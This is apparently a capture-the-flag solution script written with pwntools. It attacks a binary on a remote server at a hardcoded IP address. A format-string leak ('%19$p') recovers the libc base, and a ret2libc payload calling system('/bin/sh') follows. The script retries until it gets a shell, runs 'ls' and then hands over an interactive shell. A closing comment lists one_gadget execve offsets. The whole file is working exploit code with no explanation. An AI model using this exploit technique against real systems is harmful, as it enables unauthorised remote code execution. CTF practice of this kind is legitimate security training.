from pwn import *
#context.log_level ='DEBUG'
while True:
	#p = process('./main')
	p = remote('47.99.176.38',5210)
	try:
		p.recvuntil("Input your name:")
		p.send("%19$p")
		libc_base=int(p.recv(10),16)-0x18637
		one=libc_base+0x3AC69
		system = libc_base +  0x03A940
		binsh = libc_base +  0x15902B
		payload=p32(system)+p32(0) + p32(binsh)+"\x00"*0x18+'\x24'
		p.send(payload)
		p.recvuntil('Have you got the shell yet? :)')
		sleep(0.01)
		p.sendline('ls')
		log.info(p.recv())
		break
	except:
		p.close()
		continue
p.interactive()
'''
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])

'''

